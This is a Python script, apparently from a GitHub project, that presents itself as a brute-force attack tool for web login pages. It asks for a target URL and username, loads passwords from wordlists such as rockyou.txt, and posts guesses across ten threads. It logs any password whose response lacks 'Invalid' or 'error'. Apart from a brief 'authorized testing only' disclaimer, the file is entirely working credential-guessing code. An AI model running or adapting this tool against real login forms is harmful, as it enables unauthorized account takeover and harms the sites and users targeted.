import os
import requests
import time
from threading import Thread, Lock
from queue import Queue

# -----------------------------
# Screen clear + Banner
# -----------------------------
os.system('clear')  # Linux/Termux
# os.system('cls')   # Windows হলে uncomment করো

banner = """
╔═════════════════════════════════════════════════════════╗
║                  BRUTE-FORCE ATTACK TOOL                ║
║═════════════════════════════════════════════════════════║
║     TOOL OWNER    ║   ARSHAN AHMED ERFAN                ║
║═════════════════════════════════════════════════════════║
║       GITHUB      ║   https://github.com/UTR-ShadowHex  ║
╚═════════════════════════════════════════════════════════╝
"""
print(banner)

warning = """ WARNING

⚠️ For authorized testing only — do not use on systems you don't own.
🛑 You are fully responsible for any misuse or damage.
```0
"""
print(warning)
# -----------------------------
# Inputs
# -----------------------------
url = input("👉 Enter login page URL (e.g. http://example.com/login.php): ")
username = input("👉 Enter username: ")

# Wordlists
wordlists = ["rockyou.txt", "custom.txt", "admin4digit.txt"]

# Thread settings
num_threads = 10
delay = 0.1

# -----------------------------
# Thread-safe print and queue
# -----------------------------
print_lock = Lock()
job_queue = Queue()

# Load passwords from wordlists
for wordlist in wordlists:
    try:
        with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                password = line.strip()
                if password:
                    job_queue.put(password)
    except FileNotFoundError:
        print(f"[!] Wordlist {wordlist} not found, skipping.")

total_jobs = job_queue.qsize()
print(f"[+] Total passwords loaded: {total_jobs}\n")

# Worker function
def worker():
    while not job_queue.empty():
        password = job_queue.get()
        data = {"username": username, "password": password}
        try:
            response = requests.post(url, data=data, timeout=10)

            # Check for successful login
            if "Invalid" not in response.text and "error" not in response.text:
                with print_lock:
                    print(f"\n[✅] Password found: {password}")
                    with open("log.txt", "a", encoding="utf-8") as log:
                        log.write(f"{username}: {password}\n")
                while not job_queue.empty():
                    job_queue.get()
                break
            else:
                with print_lock:
                    print(f"[-] Tried: {password}")

        except requests.exceptions.RequestException as e:
            with print_lock:
                print(f"[!] Error: {e}")

        time.sleep(delay)
        job_queue.task_done()

# Start threads
threads = []
for i in range(num_threads):
    t = Thread(target=worker)
    t.start()
    threads.append(t)

# Wait for all threads to finish
for t in threads:
    t.join()

print("\n[✘] Brute-force completed.")

